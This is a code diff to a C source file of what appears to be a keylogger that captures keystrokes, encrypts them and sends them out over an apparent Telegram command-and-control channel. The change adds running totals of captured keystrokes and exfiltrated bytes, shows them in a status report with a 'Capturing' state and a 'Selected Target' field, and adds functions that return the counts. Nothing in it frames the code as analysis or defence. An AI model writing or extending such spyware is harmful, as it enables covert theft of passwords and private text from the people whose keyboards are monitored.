@@ -61,6 +61,8 @@ static size_t inactivity_flush_ms;
 static int stopping;
 static int worker_started;
 static volatile int keyboard_paused;
+static uint64_t total_keyboard_bytes;
+static uint64_t total_keyboard_keystrokes;
 
 static char text_buffer[KEYBOARD_BUFFER_CAPACITY];
 static size_t text_buffer_len;
@@ -202,6 +204,7 @@ void keyboard_output_append(const char *text, size_t length)
         return;
 
     queue_lock();
+    total_keyboard_keystrokes += length;
 
     for (size_t i = 0; i < length; i++) {
         char ch = text[i];
@@ -228,6 +231,9 @@ static void deliver_event(const keyboard_event_t *event)
     for (size_t attempt = 1; attempt <= delivery_attempts; ++attempt) {
         if (telegram_send_encrypted_data(event->encrypted_data, event->length,
                                          event->nonce, C2T_KEYBOARD_MIME_TYPE, nullptr)) {
+            queue_lock();
+            total_keyboard_bytes += event->length;
+            queue_unlock();
             return;
         }
         if (attempt < delivery_attempts) {
@@ -353,12 +359,24 @@ void keyboard_get_status_info(char *buffer, size_t max_len)
     size_t cur_items = queue_items;
     size_t cur_bytes = queue_bytes;
     size_t cur_buf = text_buffer_len;
+    uint64_t tot_bytes = total_keyboard_bytes;
+    uint64_t tot_keys = total_keyboard_keystrokes;
     queue_unlock();
+
+    char tot_str[64] = {};
+    if (tot_bytes < 1024) {
+        snprintf(tot_str, sizeof(tot_str), "%llu B", (unsigned long long)tot_bytes);
+    } else if (tot_bytes < 1024 * 1024) {
+        snprintf(tot_str, sizeof(tot_str), "%.1f KB (%llu B)", (double)tot_bytes / 1024.0, (unsigned long long)tot_bytes);
+    } else {
+        snprintf(tot_str, sizeof(tot_str), "%.2f MB (%llu bytes)", (double)tot_bytes / (1024.0 * 1024.0), (unsigned long long)tot_bytes);
+    }
 
     snprintf(buffer, max_len,
              "⌨️ <b>Keyboard Listener Status</b>\n\n"
              "• <b>Status:</b> %s\n"
              "• <b>Active Layout:</b> %s\n"
+             "• <b>Total Delivered:</b> %s in %llu keystrokes\n"
              "• <b>Format Mode:</b> %s\n"
              "• <b>Selected Target:</b> <code>%s</code>\n"
              "• <b>Detected Devices:</b> %d\n"
@@ -367,6 +385,7 @@ void keyboard_get_status_info(char *buffer, size_t max_len)
              "• <b>Inactivity Flush:</b> %llu ms",
              paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Capturing)",
              layout_name,
+             tot_str, (unsigned long long)tot_keys,
              mode == KEYBOARD_MODE_CODE ? "<code>Code Block (&lt;pre&gt;&lt;code&gt;)</code>" : "<code>Raw Plain Text</code>",
              target,
              dev_count,
@@ -374,6 +393,22 @@ void keyboard_get_status_info(char *buffer, size_t max_len)
              (unsigned long long)cur_items,
              (unsigned long long)cur_bytes,
              (unsigned long long)inactivity_flush_ms);
+}
+
+uint64_t keyboard_get_total_bytes(void)
+{
+    queue_lock();
+    uint64_t val = total_keyboard_bytes;
+    queue_unlock();
+    return val;
+}
+
+uint64_t keyboard_get_total_keystrokes(void)
+{
+    queue_lock();
+    uint64_t val = total_keyboard_keystrokes;
+    queue_unlock();
+    return val;
 }
 
 
